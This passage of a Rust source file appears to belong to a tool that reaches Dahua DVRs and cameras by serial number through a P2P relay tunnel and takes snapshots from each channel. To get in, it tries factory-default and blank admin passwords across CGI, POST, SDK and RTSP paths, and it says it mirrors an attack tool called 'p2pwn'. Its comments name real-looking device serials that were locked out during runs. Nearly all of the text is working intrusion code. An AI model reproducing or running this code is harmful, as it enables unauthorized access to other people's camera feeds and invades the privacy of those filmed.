                    &client_pass,
                    probe_timeout,
                )
                .await
            });
            let accepted = tokio::time::timeout(probe_timeout, listener.accept()).await;
            let jpeg = match accepted {
                Ok(Ok((stream, _))) => {
                    rtsp_forward_realm(sock, pcp_session, realm, stream, probe_timeout).await;
                    let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
                    client.await.unwrap_or(None)
                }
                _ => {
                    if verbose {
                        eprintln!(
                            "  [debug] ch{} {} RTSP relay: no local client connected",
                            ch, label
                        );
                    }
                    let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
                    client.await.unwrap_or(None)
                }
            };
            if let Some(jp) = jpeg {
                if verbose {
                    eprintln!(
                        "  [debug] ch{} OK: {} RTSP-over-tunnel port {}",
                        ch, label, rport
                    );
                }
                return Some(jp);
            } else if verbose {
                eprintln!(
                    "  [debug] ch{} {} RTSP-over-tunnel port {} failed",
                    ch, label, rport
                );
            }
        }
    }
    if verbose {
        eprintln!("  [debug] ch{} all RTSP-over-tunnel attempts failed", ch);
    }
    None
}

async fn snapshot_devices(
    serials: &[String],
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    // snapshot credentials are optional: admin_pass and session cookie are tried first.
    let out_dir = snapshot_output_dir(args.serials_file.as_deref());
    std::fs::create_dir_all(&out_dir).ok();
    println!("[*] snapshot output folder: {}", out_dir);
    let mut failed: Vec<(String, String)> = Vec::new();
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] snapshot {}", i + 1, serials.len(), serial);
        println!("========================================");
        match snapshot_device(serial, args, &out_dir, probe_timeout).await {
            Ok(()) => {}
            Err(e) => {
                eprintln!("  [-] {} → SNAPSHOT FAIL: {}", serial, e);
                failed.push((serial.clone(), e));
            }
        }
    }
    if !failed.is_empty() {
        let now: chrono::DateTime<chrono::Local> = chrono::Local::now();
        let log_name = format!("{}.log", now.format("%Y%d%m%H%M"));
        // Record the reason next to the serial: a bare list of serials gives no
        // clue about whether the device was offline, auth-blocked or unframed.
        let body: String = failed
            .iter()
            .map(|(s, e)| format!("{}\t{}", s, e.replace('\n', " ")))
            .collect::<Vec<_>>()
            .join("\n");
        std::fs::write(&log_name, body + "\n").ok();
        println!(
            "[*] {} failed snapshot(s) — serial + reason saved to {}",
            failed.len(),
            log_name
        );
    }
    Ok(())
}

/// Persist a snapshot response that arrived but could not be turned into a JPEG.
///
/// Only worth doing for a success status: that is the case where the device
/// *did* answer with an image and something in our framing dropped it. `7C03FF7PAZ93E44`
/// answered `200 OK` with a valid SOI but 2203 bytes and no EOI, and because
/// that bind succeeds only intermittently the evidence is easy to lose. Writing
/// the raw response means the next successful bind keeps the evidence on disk
/// instead of in a log that is about to scroll away.
fn dump_unusable_snapshot(
    serial: &str,
    ch: u32,
    label: &str,
    port: u16,
    headers: &str,
    body: &[u8],
) {
    let status = headers
        .lines()
        .find(|l| l.starts_with("HTTP/"))
        .unwrap_or("");
    if !status.contains(" 2") {
        return;
    }
    let dir = std::path::Path::new("snapshots");
    std::fs::create_dir_all(dir).ok();
    let path = dir.join(format!("{}_ch{}_{}_{}.http", serial, ch, label, port));
    let mut out = Vec::new();
    out.extend_from_slice(headers.as_bytes());
    out.push(b'\n');
    out.extend_from_slice(body);
    if std::fs::write(&path, &out).is_ok() {
        eprintln!(
            "  [debug] ch{} saved unusable {} response to {} ({} body bytes)",
            ch,
            status.trim(),
            path.display(),
            body.len()
        );
    }
}

/// Probe every candidate bind port once and drop the ones that do not answer,
/// so the dead ports are not re-tried for every path/credential of every
/// channel. Must run while the device has a free PTCP slot: on a single-channel
/// DVR a probe sent while the DHIP realm is still bound comes back `BindFailed`.
async fn narrow_bind_ports(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    bind_ports: &mut Vec<u16>,
    probe_timeout: Duration,
    verbose: bool,
) {
    if bind_ports.len() <= 1 {
        return;
    }
    let probe_path = "/cgi-bin/snapshot.cgi?action=snapshot&channel=1".to_string();
    let mut live: Vec<u16> = Vec::new();
    for &p in bind_ports.iter() {
        let outcome = probe_bind_port(
            sock,
            pcp_session,
            p,
            &probe_path,
            "127.0.0.1",
            probe_timeout,
        )
        .await;
        if verbose {
            eprintln!("  [debug] port {} probe: {:?}", p, outcome);
        }
        if outcome == PortProbe::Alive {
            live.push(p);
        }
    }
    // Never narrow to nothing: a device that ignores the plain GET may still
    // answer the authenticated retry, so keep the previous list as fallback.
    if !live.is_empty() {
        if verbose {
            eprintln!("  [debug] bind ports narrowed {:?} → {:?}", bind_ports, live);
        }
        *bind_ports = live;
    } else if verbose {
        eprintln!("  [debug] no port answered the probe, keeping all candidates");
    }
}

/// Ensure a reusable SDK (37777) login for the device. The device login is
/// per-device, not per-channel, so each candidate credential is tried **once**
/// and the resulting session is cached for every later channel. On a locked or
/// invalid account `dead` is set so later channels do not burn more of the
/// device's login-attempt budget.
async fn sdk_ensure_login(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    creds: &[(String, String, String)],
    slot: &mut Option<(sdk::SdkSession, String)>,
    dead: &mut bool,
    verbose: bool,
) -> bool {
    if *dead {
        return false;
    }
    if slot.is_some() {
        return true;
    }
    let tag_of = |label: &str| -> String {
        if label.is_empty() {
            "sdk".to_string()
        } else {
            label.to_string()
        }
    };
    for (label, user, pass) in creds {
        let client = sdk::SdkClient::new(user, pass).with_verbose(verbose);
        match client.open_session(sock, pcp_session).await {
            Ok(s) => {
                if verbose {
                    eprintln!("  [debug] SDK login ok ({}), reusing for all channels", tag_of(label));
                }
                *slot = Some((s, tag_of(label)));
                return true;
            }
            Err(e) => {
                if verbose {
                    eprintln!("  [debug] SDK login ({}) rejected: {}", tag_of(label), e.describe());
                }
                if e.should_abort() {
                    eprintln!(
                        "  [!] aborting SDK logins: {} (further attempts would lock the account)",
                        e.describe()
                    );
                    *dead = true;
                    return false;
                }
            }
        }
    }
    false
}

async fn snapshot_device(
    serial: &str,
    args: &Args,
    out_dir: &str,
    probe_timeout: Duration,
) -> Result<(), String> {
    let hr = p2p_handshake_retry(serial, args, args.verbose)
        .await
        .map_err(|e| format!("P2P handshake failed: {}", e))?;

    let (sock, pcp_session) = if args.relay {
        (&hr.agent_socket, &hr.agent_session)
    } else {
        (&hr.device_socket, &hr.device_session)
    };

    // The DHIP challenge + logged-in session is OPTIONAL on this path. A0/SDK-only
    // devices refuse it (login error / silent logout), which used to abort the
    // snapshot before any attempt. The channel count can come from the binary SDK
    // (37777) and the ports from the decrypted /info/device blob, so the CGI/SDK/
    // RTSP attempts below all work without a DHIP session — that is how p2pwn
    // takes snapshots.
    let mut ctx: Option<DhipCtx> = None;
    let mut chal: Option<DhipChallengeInfo> = None;
    if let Some(c) = dhp_challenge(sock, pcp_session, args, probe_timeout).await {
        if args.verbose {
            eprintln!("[debug] DHIP realm: {:?} (port {})", c.realm, c.port);
        }
        match dhip_established_session(sock, pcp_session, &c, args, probe_timeout).await {
            Ok(cc) => {
                ctx = Some(cc);
                chal = Some(c);
            }
            Err(e) => {
                if args.verbose {
                    eprintln!(
                        "  [debug] DHIP session failed ({}) — continuing without it",
                        e
                    );
                }
                ptcp_disconnect(sock, pcp_session, c.realm_id).await;
            }
        }
    } else if args.verbose {
        eprintln!("  [debug] DHIP challenge failed (no realm) — snapshot without DHIP session");
    }

    // 1) Discover active channels.
    let mut channels = match ctx.as_ref() {
        Some(c) => discover_channels(sock, pcp_session, c, args.verbose, probe_timeout).await,
        None => Vec::new(),
    };
    let probing = channels.is_empty();
    if probing {
        // Middle fallback: ask binary SDK (37777, through the tunnel) for the
        // channel count before resorting to a blind 1..=16 probe. Credentials
        // tried: --user/--password, --admin-user/--admin-pass, then the
        // factory default passwords (--try-defaults) and finally blank.
        let mut creds: Vec<(String, String, String)> = Vec::new();
        for (quser, qpass) in [
            (args.user.clone(), args.password.clone()),
            (args.admin_user.clone(), args.admin_pass.clone()),
        ] {
            if !quser.is_empty() && !qpass.is_empty() {
                creds.push((String::new(), quser, qpass));
            }
        }
        if args.try_defaults {
            for pw in DEFAULT_ADMIN_PASSWORDS {
                if args.admin_user.is_empty() || args.admin_pass == *pw {
                    continue;
                }
                creds.push((
                    format!("sdk-default"),
                    args.admin_user.clone(),
                    (*pw).to_string(),
                ));
            }
        }
        if args.password.is_empty() && args.admin_pass.is_empty() {
            creds.push((String::new(), "admin".to_string(), String::new()));
        }
        for (label, quser, qpass) in creds {
            if args.verbose {
                let tag = if label.is_empty() {
                    "sdk".to_string()
                } else {
                    label
                };
                eprintln!("  [debug] discover {} channels via {}", serial, tag);
            }
            let client = sdk::SdkClient::new(&quser, &qpass).with_verbose(args.verbose);
            match client.get_device_info(sock, pcp_session).await {
                sdk::SdkInfo::Channels { channels: n, .. } => {
                    if n > 0 {
                        println!(
                            "  [!] no channel list exposed; SDK reports {} channel(s)",
                            n
                        );
                        channels = (1..=n.min(16) as u32).collect();
                        break;
                    }
                }
                // The device refused to open the 37777 channel at all. That is a
                // channel/slot limit, not a credentials problem, so the remaining
                // logins would fail the same way — `7C03FF7PAZ93E44` burned six
                // binds on this before falling through to a blind 1..=16 probe.
                sdk::SdkInfo::BindFailed => {
                    if args.verbose {
                        eprintln!(
                            "  [debug] SDK bind on 37777 refused, skipping remaining credentials"
                        );
                    }
                    break;
                }
                sdk::SdkInfo::AuthRejected(e) => {
                    if args.verbose {
                        eprintln!("  [debug] SDK discovery login rejected: {}", e.describe());
                    }
                    if e.should_abort() {
                        if args.verbose {
                            eprintln!(
                                "  [debug] SDK account locked/invalid, skipping remaining credentials"
                            );
                        }
                        break;
                    }
                }
            }
        }
    }
    let probing = channels.is_empty();
    if probing {
        println!("  [!] no channel list exposed; falling back to probe 1..=16");
        channels = (1..=16).collect();
    }
    println!(
        "  [i] {} channel(s) to snapshot{}",
        channels.len(),
        if probing { " (probing)" } else { "" }
    );
    // Diagnostic cap (env): restrict the snapshot loop to the first N channels,
    // and cheaply e.g. when trialling digest variants against one channel.
    if let Ok(max) = std::env::var("DAHUA_MAX_CH") {
        if let Ok(n) = max.trim().parse::<usize>() {
            channels.truncate(n);
            eprintln!(
                "  [debug] DAHUA_MAX_CH env: limited to {} channel(s)",
                channels.len()
            );
        }
    }

    // 2) Snapshot each channel over HTTP through the same tunnel.
    //    Auth strategies (tried per-channel in order):
    //      a) Session cookie only (DHIP session already authenticated)
    //      b) Admin credentials (same ones used for addUser)
    //      c) Camera stream credentials (-u/-w)
    //    If --direct-http is set and all PTCP methods fail, retry via direct TCP to device IP.
    let session_str = ctx
        .as_ref()
        .map(|c| c.session_id.to_string())
        .unwrap_or_default();
    let device_ip = hr.device_public_ip.clone();

    // Query the device for its actual HTTP and RTSP ports. When a DHIP session
    // is available the InetWeb/Network config tables win; the decrypted
    // /info/device blob (`httpport`/`rtspport`) from the handshake fills in when
    // it is not (A0/SDK-only devices) or when the tables stay quiet.
    let mut ports = NetworkPorts {
        http: hr.device_http_port,
        rtsp: hr.device_rtsp_port,
    };
    if let Some(c) = ctx.as_ref() {
        let queried = query_network_ports(
            sock,
            pcp_session,
            &c.dhip,
            c.session_id,
            probe_timeout,
            args.verbose,
        )
        .await;
        if queried.http.is_some() {
            ports.http = queried.http;
        }
        if queried.rtsp.is_some() {
            ports.rtsp = queried.rtsp;
        }
    }
    let http_port = ports.http.unwrap_or(80);
    let rtsp_port = ports.rtsp.unwrap_or(554);

    // The DHIP channel stays open here: the first CGI attempt per channel runs
    // over the live challenge realm (no bind) because some DVRs only serve
    // their web API on the channel that carries the DHIP session
    // (`7C03FF7PAZ93E44` answered 200 there in the pre-f744c3c flow, while a
    // fresh bind draws silence). Only when that produces nothing is the channel
    // freed, just before the per-request bind pipeline needs it.
    let mut dhip_freed = !chal.is_some();

    // HTTP over PTCP, following p2pwn: every request gets a freshly bound realm
    // (tunnel.go:1226). The device tears the connection down when it answers 401,
    // so a retry sent on the same realm is never answered — that is why the
    // reference re-binds per attempt instead of reusing the challenge channel.
    // Port 80 comes first because the reference binds a fixed 127.0.0.1:80 and
    // never consults the device; the port reported by InetWeb is the next
    // candidate.
    let mut bind_ports: Vec<u16> = vec![80];
    for p in [http_port, 8080, 8000, 5000] {
        if !bind_ports.contains(&p) {
            bind_ports.push(p);
        }
    }
    if args.verbose {
        eprintln!("[debug] snapshot HTTP bind ports: {:?}", bind_ports);
    }

    // Probe each candidate port once and keep only the live ones. Without this
    // the dead ports are re-tried for every path and every credential strategy
    // of every channel, each retry burning a full timeout. When the DHIP realm
    // is still bound (single-channel DVR) every probe reads BindFailed, so the
    // real probe runs lazily right after that realm is freed.
    if dhip_freed {
        narrow_bind_ports(sock, pcp_session, &mut bind_ports, probe_timeout, args.verbose).await;
    }

    let mut bind_ports_probed = dhip_freed;

    let mut captured = 0usize;
    let mut consecutive_failures = 0usize;

    // One SDK (37777) login per device, reused across every channel: the device
    // login is per-device, so re-logging in per channel/credential is wasteful
    // and dangerous (each failed attempt eats the account's remaining budget —
    // 7C03FF7PAZ93E44 locked after a per-channel credential loop).
    let mut sdk_slot: Option<(sdk::SdkSession, String)> = None;
    let mut sdk_dead = false;

    for ch in &channels {
        let mut body: Option<Vec<u8>> = None;
        // Last HTTP status line the device actually answered with, so a failed
        // channel reports "401 Unauthorized" instead of claiming no response.
        let mut last_status: Option<String> = None;

        // Build candidate (label, query_user, query_pass) tuples.
        let mut strategies: Vec<(&str, String, String)> = Vec::new();
        let p2pwn_mode_env = std::env::var_os("DAHUA_SNAP_P2PWN").is_some();
        if p2pwn_mode_env {
            // p2pwn parity mode: only the explicit device account (-u/-w) or
            // --admin-pass is used; anonymous session/defaults are skipped. The
            // relay's PTCP bind budget is tight, so exactly one credential pair
            // is tried per mechanism.
            if !args.admin_pass.is_empty() {
                strategies.push(("admin", args.admin_user.clone(), args.admin_pass.clone()));
            } else if !args.password.is_empty() {
                strategies.push(("camera", args.user.clone(), args.password.clone()));
            }
        } else {
            if !session_str.is_empty() {
                strategies.push(("session", String::new(), String::new()));
            }
            if !args.admin_pass.is_empty() {
                strategies.push(("admin", args.admin_user.clone(), args.admin_pass.clone()));
            }
            if !args.password.is_empty() {
                strategies.push(("camera", args.user.clone(), args.password.clone()));
            }
        }
        if !p2pwn_mode_env && args.try_defaults {
            let admin_user = if args.admin_user.is_empty() {
                "admin".to_string()
            } else {
                args.admin_user.clone()
            };
            for pw in DEFAULT_ADMIN_PASSWORDS {
                if args.admin_pass == *pw {
                    continue;
                }
                strategies.push(("admin-default", admin_user.clone(), (*pw).to_string()));
            }
            // last resort: empty admin password (installer-configured devices)
            if args.admin_pass.is_empty() && !p2pwn_mode_env {
                strategies.push(("admin-empty", admin_user.clone(), String::new()));
            }
        }

        // CGI paths, mirroring `PTCPTunnel.Snapshot` (tunnel.go:1471):
        // `action=snapshot` first, then the bare CGI, then the jpeg.cgi alias.
        //
        // The last two ask for a thumbnail explicitly. A camera that defaults to
        // full resolution answers `Content-Length: 587243` (`7C03FF7PAZ93E44`),
        // and a payload that large does not survive the PTCP relay — we read a
        // few KB of it and then time out with no EOI, so the image is discarded
        // as truncated. Cameras that already default to a thumbnail (352x288,
        // ~7 KB) are served by the first three variants as before.
        let path_variants: Vec<String> =
            if std::env::var_os("DAHUA_SNAP_P2PWN").is_some() {
                // p2pwn parity mode (env): a single clean snapshot.cgi attempt
                // per credential strategy, then straight to SDK/RTSP. The relay
                // agent stops ACKing binds after a burst of them, and p2pwn
                // stays under that budget. `7F00CB6PAZ3FC73` wedged after ~10
                // binds: the first CGI exchange answered 200 with a real JPEG,
                // then every later bind drew silence (no CONN from the agent).
                vec![format!(
                    "/cgi-bin/snapshot.cgi?action=snapshot&channel={}",
                    ch
                )]
            } else {
                vec![
                    format!("/cgi-bin/snapshot.cgi?action=snapshot&channel={}", ch),
                    "/cgi-bin/snapshot.cgi".to_string(),
                    format!("/cgi-bin/jpeg.cgi?channel={}", ch),
                    format!(
                        "/cgi-bin/snapshot.cgi?action=snapshot&channel={}&width=352&height=288",
                        ch
                    ),
                    format!("/cgi-bin/snapshot.cgi?channel={}&width=352&height=288", ch),
                ]
            };
        // Some firmwares ignore the Authorization header and only read
        // credentials from the query string.
        let with_creds = |variant: &str, user: &str, pass: &str| -> String {
            if user.is_empty() {
                variant.to_string()
            } else if variant.contains('?') {
                format!("{}&user={}&password={}", variant, user, pass)
            } else {
                format!("{}?user={}&password={}", variant, user, pass)
            }
        };

        // === LIVE DHIP-channel CGI (reuse the challenge realm, no bind) ===
        //
        // The pre-f744c3c snapshot flow re-sent the CGI over the still-open
        // DHIP channel and `7C03FF7PAZ93E44` answered 200 there (Sep dump
        // ch1_admin_80.http) while every fresh bind drew nothing but silence:
        // the DVR accepts one PTCP channel and only serves its web API on it.
        // Try the challenge realm first; the relay bind budget is untouched
        // because no bind is involved. Only when the realm answers with
        // nothing usable is it freed for the per-request bind pipeline.
        if body.is_none() && !dhip_freed {
            if let Some(realm_id) = chal.as_ref().map(|c| c.realm_id) {
                let mut realm_hosts = vec![http_port];
                for p in [5000u16, 80u16] {
                    if !realm_hosts.contains(&p) {
                        realm_hosts.push(p);
                    }
                }
                // A silent realm costs a full probe timeout and a wrong cred
                // pair signs nothing: cap the whole probe so an offline web
                // server cannot burn minutes before the bind pipeline runs.
                let mut live_budget = 6usize;
                'live: for &hp in &realm_hosts {
                    let host = format!("127.0.0.1:{}", hp);
                    for (label, quser, qpass) in &strategies {
                        for variant in &path_variants {
                            if live_budget == 0 {
                                break 'live;
                            }
                            live_budget -= 1;
                            // Try bare variant first, then with creds
                            let mut live_paths = vec![variant.clone()];
                            let wc = with_creds(variant, quser, qpass);
                            if wc != *variant {
                                live_paths.push(wc);
                            }
                            for path in &live_paths {
                                if live_budget == 0 {
                                    break 'live;
                                }
                                live_budget -= 1;
                                if args.verbose {
                                    eprintln!(
                                        "  [debug] ch{} live-DHIP {} port={} path={}",
                                        ch, label, hp, path
                                    );
                                }
                                let some = http_get_binary_on_realm(
                                    sock,
                                    pcp_session,
                                    realm_id,
                                    &host,
                                    path,
                                    probe_timeout,
                                    quser,
                                    qpass,
                                    &session_str,
                                )
                                .await;
                                let Some((ref_h, ref_b)) = some else {
                                    if args.verbose {
                                        eprintln!(
                                            "  [debug] ch{} live-DHIP {} port={} → {}",
                                            ch,
                                            label,
                                            hp,
                                            if LAST_CALL_DISC.load(Ordering::Relaxed)
                                            {
                                                "DISC (channel torn down)"
                                            } else {
                                                "no bytes"
                                            }
                                        );
                                    }
                                    continue;
                                };
                                last_status = Some(
                                    ref_h
                                        .lines()
                                        .find(|l| l.starts_with("HTTP/"))
                                        .unwrap_or("HTTP (no status line)")
                                        .trim()
                                        .to_string(),
                                );
                                if args.verbose {
                                    eprintln!(
                                        "  [debug] ch{} live-DHIP {} port={} → {} ({} bytes)",
                                        ch,
                                        label,
                                        hp,
                                        last_status.as_deref().unwrap_or(""),
                                        ref_b.len()
                                    );
                                }
                                if let Some(jpeg) = extract_jpeg_from_http(&ref_h, &ref_b) {
                                    body = Some(jpeg);
                                    if args.verbose {
                                        eprintln!(
                                            "  [debug] ch{} OK: {} live-DHIP port={}",
                                            ch, label, hp
                                        );
                                    }
                                    break 'live;
                                }
                            }
                        }
                        if body.is_some() {
                            break;
                        }
                    }
                    if body.is_some() {
                        break;
                    }
                }
            }
            // The live realm answered with silence or an unusable body: free it
            // now, the per-request bind pipeline below needs the one PTCP
            // channel. Freed once; later channels skip the live attempt.
            if body.is_none() {
                if let Some(c) = chal.as_ref() {
                    if args.verbose {
                        eprintln!(
                            "  [debug] ch{} freeing DHIP realm={} before bind pipeline",
                            ch, c.realm_id
                        );
                    }
                    ptcp_disconnect(sock, pcp_session, c.realm_id).await;
                }
                dhip_freed = true;
                // The DHIP realm just released the single PTCP slot: now the
                // port probe reflects reality instead of reading BindFailed.
                if !bind_ports_probed {
                    narrow_bind_ports(
                        sock,
                        pcp_session,
                        &mut bind_ports,
                        probe_timeout,
                        args.verbose,
                    )
                    .await;
                    bind_ports_probed = true;
                }
            }
        }

        if p2pwn_mode_env {
            // p2pwn parity: RTSP is attempted before the CGI channels burn the
            // relay's bind budget. Some DVRs truncate snapshot.cgi's stream at
            // 3-4 KB (7F00CB6PAZ3FC73: Content-Length 10244, 3484 delivered,
            // then the agent stops ACKing every later bind) and only serve a
            // full frame over RTSP.
            if body.is_none() {
                let rtsp_creds: Vec<(&str, String, String)> = strategies
                    .iter()
                    .map(|(l, u, p)| (*l, u.clone(), p.clone()))
                    .collect();
                if let Some(jp) =
                    grab_rtsp_tunnel(sock, pcp_session, &rtsp_creds, rtsp_port, *ch, probe_timeout, args.verbose)
                        .await
                {
                    body = Some(jp);
                }
            }
            // Next in p2pwn order after RTSP is the SDK channel (the CGI
            // snapshot.cgi exchange flatlines the relay agent on some DVRs, so
            // it comes last). The DHIP channel was already freed during port
            // narrowing, so the 37777 bind is free to use. The login is done
            // once per device and reused for every channel.
            if body.is_none() {
                let creds: Vec<(String, String, String)> = strategies
                    .iter()
                    .map(|(l, u, p)| ((*l).to_string(), u.clone(), p.clone()))
                    .collect();
                if sdk_ensure_login(
                    sock,
                    pcp_session,
                    &creds,
                    &mut sdk_slot,
                    &mut sdk_dead,
                    args.verbose,
                )
                .await
                {
                    let (sess, label) = sdk_slot.as_ref().unwrap();
                    if args.verbose {
                        eprintln!("  [debug] ch{} snapshot via reused SDK login ({})", ch, label);
                    }
                    let client = sdk::SdkClient::new("", "").with_verbose(args.verbose);
                    let jpeg = client.snapshot_on(sock, pcp_session, sess, *ch as usize).await;
                    if let Some(jpeg_data) = jpeg {
                        if args.verbose {
                            eprintln!("  [debug] ch{} OK: {} SDK snapshot", ch, label);
                        }
                        body = Some(jpeg_data);
                    } else if args.verbose {
                        eprintln!("  [debug] ch{} {} SDK snapshot failed", ch, label);
                    }
                }
                if body.is_none() && args.verbose {
                    eprintln!("  [debug] ch{} all SDK snapshot attempts failed", ch);
                }
            }
        }

        // === PTCP HTTP GET (fresh realm per request, challenge-driven auth) ===
        for (label, ref_quser, ref_qpass) in &strategies {
            for variant in &path_variants {
                // The clean path comes first: some firmware validates the Digest
                // over the URI *without* any `user=`/`password=` it never asked
                // for, so a response computed over the credential-bearing URI is
                // rejected with 401 on every variant (7H0623FPAZ6CAFA, realm
                // "Login to <hex>" from a session). p2pwn's Snapshot sends CGI
                // URIs without query credentials and authenticates only through
                // the Authorization header. The credential form is kept for the
                // firmware that only reads the query string.
                let clean = variant.clone();
                let with_q = with_creds(variant, ref_quser, ref_qpass);
                let p2pwn_mode = std::env::var_os("DAHUA_SNAP_P2PWN").is_some();
                let requests: Vec<String> = if p2pwn_mode {
                    // p2pwn sends CGI URIs bare and authenticates through the
                    // Authorization header only; query credentials just burn a
                    // bind, and the relay's PTCP bind budget is what actually
                    // wedges this family of DVRs.
                    vec![clean]
                } else if clean == with_q {
                    vec![clean]
                } else {
                    vec![clean, with_q]
                };
                for path in requests {
                    for &port in &bind_ports {
                        if args.verbose {
                            eprintln!(
                                "  [debug] ch{} trying {} port={} path={}",
                                ch, label, port, path
                            );
                        }
                        let host = format!("127.0.0.1:{}", port);
                        // A response that is a genuine JPEG with no EOI is a
                        // *promising* failure: the web server answered with a
                        // real frame but the relay dropped part of it. Fresh
                        // binds are cheap, and one lost datagram used to
                        // condemn the whole channel (7F00CB6PAZ3FC73 delivered
                        // 2205/9112 bytes on the first exchange, then the DVR
                        // went silent for every later bind). Giving the same
                        // request a couple more attempts survives a one-off
                        // drop; non-JPEG failures (401/403/silent) never retry.
                        let mut trunc_retries = 0u32;
                        const MAX_TRUNC_RETRIES: u32 = 3;
                        loop {
                            let some = http_get_tunnel(
                                sock,
                                pcp_session,
                                port,
                                &host,
                                &path,
                                probe_timeout,
                                ref_quser,
                                ref_qpass,
                                &session_str,
                            )
                            .await;
                            let Some((ref_h, ref_b)) = some else {
                                break;
                            };
                            if let Some(jpeg) = extract_jpeg_from_http(&ref_h, &ref_b) {
                                body = Some(jpeg);
                                if args.verbose {
                                    eprintln!("  [debug] ch{} OK: {} port={}", ch, label, port);
                                }
                                break;
                            }
                            let truncated = ref_b.len() >= 100
                                && ref_b.starts_with(&[0xFF, 0xD8])
                                && !ref_b.ends_with(&[0xFF, 0xD9])
                                && ref_h.lines().any(|l| {
                                    l.trim_start().starts_with("HTTP/") && l.contains("200")
                                });
                            if truncated && trunc_retries < MAX_TRUNC_RETRIES {
                                trunc_retries += 1;
                                if std::env::var_os("DAHUA_TRUNC_DEBUG").is_some() {
                                    let cl = ref_h
                                        .lines()
                                        .find(|l| {
                                            l.trim_start()
                                                .to_ascii_lowercase()
                                                .starts_with("content-length:")
                                        })
                                        .map(|l| l.trim().to_string())
                                        .unwrap_or("(none)".into());
                                    let body = &ref_b[ref_b.len().saturating_sub(24).min(ref_b.len())..];
                                    eprintln!(
                                        "  [trunc] {} CL={} got={} tail_bytes={:02X?} head={:02X?}",
                                        last_status.as_deref().unwrap_or("200"),
                                        cl,
                                        ref_b.len(),
                                        body,
                                        &ref_b[..ref_b.len().min(8)]
                                    );
                                    eprintln!(
                                        "  [trunc] headers:\n{}",
                                        ref_h
                                            .lines()
                                            .map(|l| format!("      | {}", l.trim_end()))
                                            .collect::<Vec<_>>()
                                            .join("\n")
                                    );
                                }
                                if args.verbose {
                                    eprintln!(
                                        "  [debug] ch{} {} port={} truncated JPEG ({} bytes, no EOI) — retry {}/{}",
                                        ch,
                                        label,
                                        port,
                                        ref_b.len(),
                                        trunc_retries,
                                        MAX_TRUNC_RETRIES
                                    );
                                }
                                continue;
                            }
                            if args.verbose && truncated {
                                eprintln!(
                                    "  [debug] ch{} {} port={} still truncated after {} retries",
                                    ch,
                                    label,
                                    port,
                                    MAX_TRUNC_RETRIES
                                );
                            }
                            last_status = Some(
                                ref_h
                                    .lines()
                                    .find(|l| l.starts_with("HTTP/"))
                                    .unwrap_or("HTTP (no status line)")
                                    .trim()
                                    .to_string(),
                            );
                            dump_unusable_snapshot(serial, *ch, label, port, &ref_h, &ref_b);
                            if args.verbose {
                                // Full header block, not just the status line:
                                // a truncated snapshot is only diagnosable by
                                // comparing Content-Length against what arrived
                                // (`7C03FF7PAZ93E44` sent 200 OK with a valid
                                // SOI but 2203 bytes and no EOI).
                                eprintln!(
                                    "  [debug] ch{} {} port={} → {} ({} bytes)\n{}",
                                    ch,
                                    label,
                                    port,
                                    last_status.as_deref().unwrap_or(""),
                                    ref_b.len(),
                                    ref_h
                                        .lines()
                                        .map(|l| format!("      | {}", l.trim_end()))
                                        .collect::<Vec<_>>()
                                        .join("\n")
                                );
                            }
                            break;
                        }
                        if body.is_some() {
                            break;
                        }
                    }
                }
                if body.is_some() {
                    break;
                }
            }
            if body.is_some() {
                break;
            }
        }

        // === POST form (raw) ===
        if body.is_none() && !p2pwn_mode_env {
            let cookie = if session_str.is_empty() {
                String::new()
            } else {
                format!(
                    "Cookie: DhWebClientSessionID={}; WebClientSessionID={}\r\n",
                    session_str, session_str
                )
            };
            for (label, ref_quser, ref_qpass) in &strategies {
                if ref_quser.is_empty() {
                    continue;
                }
                let post_body = format!("channel={}", ch);
                let http_request = format!(
                    "POST /cgi-bin/snapshot.cgi HTTP/1.1\r\n\
                     Host: 127.0.0.1\r\n\
                     Accept: image/jpeg,image/webp,image/*,*/*\r\n\
                     Content-Type: application/x-www-form-urlencoded\r\n\
                     Connection: close\r\n\
                     User-Agent: Mozilla/5.0\r\n\
                     Authorization: Basic {}\r\n\
                     {cookie}\
                     Content-Length: {}\r\n\
                     \r\n\
                     {}",
                    base64_encode_basic(&format!("{}:{}", ref_quser, ref_qpass)),
                    post_body.len(),
                    post_body
                );
                for &port in &bind_ports {
                    if let Some((ref_h, ref_b)) =
                        http_exchange_once(sock, pcp_session, port, &http_request, probe_timeout)
                            .await
                    {
                        if let Some(jpeg) = extract_jpeg_from_http(&ref_h, &ref_b) {
                            body = Some(jpeg);
                            if args.verbose {
                                eprintln!(
                                    "  [debug] ch{} OK: {} POST form port={}",
                                    ch, label, port
                                );
                            }
                            break;
                        }
                    }
                }
                if body.is_some() {
                    break;
                }
            }
        }

        // === SDK 37777 through the PTCP tunnel (never direct to public IP) ===
        if body.is_none() {
            // Free the DHIP channel before binding the SDK port: on devices that
            // accept a single PTCP channel at a time the still-open channel would
            // block the 37777 bind. Done once — later channels go straight to the
            // SDK without re-reading the socket.
            if !dhip_freed {
                if let Some(c) = chal.as_ref() {
                    if args.verbose {
                        eprintln!(
                            "  [debug] ch{} freeing DHIP realm={} before SDK bind",
                            ch, c.realm_id
                        );
                    }
                    ptcp_disconnect(sock, pcp_session, c.realm_id).await;
                }
                dhip_freed = true;
            }
            let mut creds: Vec<(String, String, String)> = Vec::new();
            for (label, quser, qpass) in [
                (String::new(), args.user.clone(), args.password.clone()),
                (
                    String::new(),
                    args.admin_user.clone(),
                    args.admin_pass.clone(),
                ),
            ] {
                if !quser.is_empty() && !qpass.is_empty() {
                    creds.push((label, quser, qpass));
                }
            }
            if args.try_defaults {
                for pw in DEFAULT_ADMIN_PASSWORDS {
                    if args.admin_user.is_empty() || args.admin_pass == *pw {
                        continue;
                    }
                    creds.push((
                        format!("sdk-default"),
                        args.admin_user.clone(),
                        (*pw).to_string(),
                    ));
                }
            }
            // last resort: empty password (devices set up by installers that
            // never configured a password accept the SDK login blank)
            if args.password.is_empty() && args.admin_pass.is_empty() {
                creds.push((String::new(), "admin".to_string(), String::new()));
            }
            if sdk_ensure_login(
                sock,
                pcp_session,
                &creds,
                &mut sdk_slot,
                &mut sdk_dead,
                args.verbose,
            )
            .await
            {
                let (sess, label) = sdk_slot.as_ref().unwrap();
                if args.verbose {
                    eprintln!("  [debug] ch{} snapshot via reused SDK login ({})", ch, label);
                }
